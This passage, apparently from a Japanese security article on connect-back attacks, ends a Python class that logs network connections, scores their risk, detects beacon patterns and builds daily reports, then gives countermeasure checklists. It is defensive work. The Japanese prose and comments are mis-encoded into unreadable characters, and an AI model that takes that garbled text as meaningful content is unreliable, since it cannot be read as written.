        # ãƒˆãƒƒãƒ—ãƒªã‚¹ã‚¯æ¥ç¶š
        cursor.execute('''
            SELECT dst_ip, dst_port, AVG(risk_score) as avg_risk, COUNT(*) as count
            FROM connections
            WHERE timestamp > ? AND risk_score > 50
            GROUP BY dst_ip, dst_port
            ORDER BY avg_risk DESC, count DESC
            LIMIT 10
        ''', (cutoff_time,))
        
        top_risks = cursor.fetchall()
        
        conn.close()
        
        report = {
            'report_date': datetime.now().strftime('%Y-%m-%d'),
            'connection_statistics': connection_stats,
            'alert_statistics': alert_stats,
            'top_risk_connections': [
                {
                    'destination': f"{row[0]}:{row[1]}",
                    'avg_risk_score': row[2],
                    'connection_count': row[3]
                }
                for row in top_risks
            ]
        }
        
        return report
    
    def start_monitoring(self):
        """ç›£è¦–é–‹å§‹"""
        self.monitoring = True
        
        # å®šæœŸåˆ†æã‚¹ãƒ¬ãƒƒãƒ‰
        analysis_thread = threading.Thread(target=self.periodic_analysis)
        analysis_thread.daemon = True
        analysis_thread.start()
        
        print("Connect-back monitoring system started")
    
    def periodic_analysis(self):
        """å®šæœŸçš„ãªåˆ†æ"""
        while self.monitoring:
            try:
                # ãƒ“ãƒ¼ã‚³ãƒ³ãƒ‘ã‚¿ãƒ¼ãƒ³åˆ†æ
                self.analyze_beacon_pattern()
                
                # 5åˆ†é–“éš”ã§å®Ÿè¡Œ
                time.sleep(300)
            except Exception as e:
                print(f"Analysis error: {e}")
                time.sleep(60)
    
    def stop_monitoring(self):
        """ç›£è¦–åœæ­¢"""
        self.monitoring = False
        print("Connect-back monitoring system stopped")

# ä½¿ç”¨ä¾‹
# monitor = ConnectBackMonitoringSystem()
# monitor.start_monitoring()
# 
# # æ¥ç¶šãƒ­ã‚°ã®è¨˜éŒ²ä¾‹
# monitor.log_connection('192.168.1.100', '203.0.113.50', 4444, 'TCP', 'unknown.exe', 1234)
# 
# # æ—¥æ¬¡ãƒ¬ãƒãƒ¼ãƒˆç”Ÿæˆ
# report = monitor.generate_daily_report()
# print(json.dumps(report, indent=2))
```

## ã¾ã¨ã‚

### ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯å¯¾ç­–ã®é‡è¦ãƒã‚¤ãƒ³ãƒˆ

```
âœ… åŠ¹æœçš„ãªå¯¾ç­–ã®ãŸã‚ã®è¦ç‚¹

æŠ€è¡“çš„å¯¾ç­–:
â–¡ å¤–å‘ããƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã®é©åˆ‡ãªè¨­å®š
â–¡ ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ç›£è¦–ã‚·ã‚¹ãƒ†ãƒ ã®å°å…¥
â–¡ ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆä¿è­·ã®å¼·åŒ–
â–¡ DNS ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã®å®Ÿè£…

é‹ç”¨çš„å¯¾ç­–:
â–¡ å®šæœŸçš„ãªãƒ­ã‚°åˆ†æ
â–¡ ç•°å¸¸é€šä¿¡ãƒ‘ã‚¿ãƒ¼ãƒ³ã®ç›£è¦–
â–¡ ã‚¤ãƒ³ã‚·ãƒ‡ãƒ³ãƒˆå¯¾å¿œæ‰‹é †ã®æ•´å‚™
â–¡ å¾“æ¥­å“¡ã¸ã®æ•™è‚²ãƒ»è¨“ç·´

çµ„ç¹”çš„å¯¾ç­–:
â–¡ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã®ç­–å®š
â–¡ ã‚¼ãƒ­ãƒˆãƒ©ã‚¹ãƒˆã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã®æ¡ç”¨
â–¡ ç¶™ç¶šçš„ãªè„…å¨ã‚¤ãƒ³ãƒ†ãƒªã‚¸ã‚§ãƒ³ã‚¹åé›†
â–¡ å¤–éƒ¨å°‚é–€å®¶ã¨ã®é€£æº
```

### ä»Šå¾Œã®å‹•å‘

```
ğŸ”® ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯æŠ€è¡“ã®é€²åŒ–

æ”»æ’ƒè€…ã®é€²åŒ–:
- AI ã‚’æ´»ç”¨ã—ãŸæ¤œçŸ¥å›é¿
- æ­£å¸¸ãªé€šä¿¡ã¸ã®å½è£…é«˜åº¦åŒ–
- è¤‡æ•°ãƒãƒ£ãƒãƒ«ã®åŒæ™‚ä½¿ç”¨
- ã‚¯ãƒ©ã‚¦ãƒ‰ã‚µãƒ¼ãƒ“ã‚¹ã®æ‚ªç”¨

é˜²å¾¡æŠ€è¡“ã®é€²åŒ–:
- æ©Ÿæ¢°å­¦ç¿’ã«ã‚ˆã‚‹ç•°å¸¸æ¤œçŸ¥
- è¡Œå‹•åˆ†æãƒ™ãƒ¼ã‚¹ã®æ¤œçŸ¥
- ã‚¼ãƒ­ãƒˆãƒ©ã‚¹ãƒˆãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯
- ã‚¯ãƒ©ã‚¦ãƒ‰ãƒã‚¤ãƒ†ã‚£ãƒ–ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£
```

ã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ã¯ã€ç¾ä»£ã®ã‚µã‚¤ãƒãƒ¼æ”»æ’ƒã«ãŠã„ã¦é‡è¦ãªæŠ€è¡“è¦ç´ ã§ã™ã€‚æ”»æ’ƒè€…ã¨é˜²å¾¡è€…ã®ä¸¡æ–¹ãŒã“ã®æŠ€è¡“ã‚’ç†è§£ã—ã€é©åˆ‡ãªå¯¾ç­–ã‚’è¬›ã˜ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

çµ„ç¹”ã«ãŠã„ã¦ã¯ã€æŠ€è¡“çš„ãªå¯¾ç­–ã ã‘ã§ãªãã€é‹ç”¨é¢ã§ã®ç¶™ç¶šçš„ãªç›£è¦–ã¨åˆ†æã€ãã—ã¦å¾“æ¥­å“¡ã¸ã®æ•™è‚²ã‚’çµ„ã¿åˆã‚ã›ãŸåŒ…æ‹¬çš„ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒãŒæˆåŠŸã®éµã¨ãªã‚Šã¾ã™ã€‚
